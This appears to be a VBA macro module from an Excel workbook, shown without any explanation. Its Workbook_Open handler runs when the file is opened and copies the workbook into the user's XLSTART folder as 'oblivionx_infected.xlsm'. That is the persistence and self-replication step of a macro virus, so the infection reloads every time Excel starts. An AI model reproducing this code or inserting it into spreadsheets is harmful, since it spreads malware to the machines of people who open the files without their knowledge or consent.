Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim frs0swbone As String
    frs0swbone = Environ("APPDATA") & "\Microsoft\Excel\XLSTART\oblivionx_infected.xlsm"
    ThisWorkbook.SaveCopyAs frs0swbone
End Sub
